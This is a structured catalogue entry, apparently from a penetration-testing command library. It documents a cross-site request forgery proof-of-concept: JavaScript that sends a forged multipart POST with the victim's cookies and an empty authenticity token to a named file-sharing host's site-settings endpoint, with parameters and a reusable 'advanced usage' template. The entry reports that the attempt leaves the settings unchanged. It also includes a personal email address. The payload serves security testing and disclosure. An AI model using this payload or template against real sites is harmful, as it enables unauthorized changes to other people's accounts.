---
id: cmd-submit-csrf-poc
data: >-
  var xhr = new XMLHttpRequest(); xhr.open("POST",
  "https://gaming2.brickftp.com/sites/update", true);
  xhr.setRequestHeader("Accept",
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
  xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
  xhr.setRequestHeader("Content-Type", "multipart/form-data;
  boundary=---------------------------13127814166702694341666648723");
  xhr.withCredentials = true; var body =
  "-----------------------------13127814166702694341666648723\r\nContent-Disposition:
  form-data;
  name=\"utf8\"\r\n\r\n\xe2\x9c\x93\r\n-----------------------------13127814166702694341666648723\r\nContent-Disposition:
  form-data;
  name=\"_method\"\r\n\r\npatch\r\n-----------------------------13127814166702694341666648723\r\nContent-Disposition:
  form-data;
  name=\"authenticity_token\"\r\n\r\n\r\n\r\n-----------------------------13127814166702694341666648723\r\nContent-Disposition:
  form-data;
  name=\"group\"\r\n\r\ngeneral\r\n-----------------------------13127814166702694341666648723\r\nContent-Disposition:
  form-data;
  name=\"site[name]\"\r\n\r\ngamingtoooorrrrr\r\n-----------------------------13127814166702694341666648723\r\nContent-Disposition:
  form-data;
  name=\"site[subdomain]\"\r\n\r\ngaming2\r\n-----------------------------13127814166702694341666648723\r\nContent-Disposition:
  form-data;
  name=\"site[email]\"\r\n\r\nhmahmoud@promex.me\r\n-----------------------------13127814166702694341666648723\r\nContent-Disposition:
  form-data; name=\"site[language]\"\r\n\r\nen\r\n... [truncated for brevity;
  includes all other site parameters]
  ...\r\n-----------------------------13127814166702694341666648723\r\nContent-Disposition:
  form-data;
  name=\"commit\"\r\n\r\nSave\r\n-----------------------------13127814166702694341666648723--\r\n";
  var aBody = new Uint8Array(body.length); for (var i = 0; i < aBody.length;
  i++) aBody[i] = body.charCodeAt(i); xhr.send(new Blob([aBody]));
tags:
  - csrf
  - xmlhttprequest
  - poc
type: command
output: >-
  HTTP 200 OK response with HTML redirect or success indicator; site settings
  appear updated but remain unchanged due to duplicate token validation.
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:23.627Z'
verified: false
validated: true
submitted: true
---
# submit-csrf-poc-xmlhttprequest

## Command

```javascript
var xhr = new XMLHttpRequest(); xhr.open("POST", "https://gaming2.brickftp.com/sites/update", true); xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"); xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5"); xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------13127814166702694341666648723"); xhr.withCredentials = true; var body = "-----------------------------13127814166702694341666648723\r\nContent-Disposition: form-data; name=\"utf8\"\r\n\r\n\xe2\x9c\x93\r\n... [full multipart body] ..."; var aBody = new Uint8Array(body.length); for (var i = 0; i < aBody.length; i++) aBody[i] = body.charCodeAt(i); xhr.send(new Blob([aBody]));
```

## Description

This JavaScript command, executed via XMLHttpRequest in a browser console or HTML PoC, sends a forged POST request to update Files.com site configurations, simulating a CSRF attack with an empty authenticity_token. It includes session cookies for authentication and uses multipart/form-data to mimic the original form.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL (xhr.open) | Target endpoint for submission | Yes |
| Headers (setRequestHeader) | Accept, Accept-Language, Content-Type with boundary | Yes |
| withCredentials | Includes cookies for authenticated request | Yes |
| body | Multipart string with form parameters, empty token, and modified settings | Yes |
| Blob/send | Encodes and sends the body as binary data | Yes |

## Examples

### Basic Usage

```javascript
// Execute in browser console after loading PoC
submitRequest();
```

### Advanced Usage

```javascript
// Customize body for different parameters
xhr.open("POST", "https://example.brickftp.com/sites/update", true);
// Update body string with new boundary and params
```

## Expected Output

Browser network tab shows POST request with 200 OK status, potential redirect to configuration page, and initial signs of updated settings (e.g., site name change), but verification reveals no actual changes due to the second authenticity_token.

## Related

- [[Related Procedure: Test-Modified-CSRF-Form-Submission]]
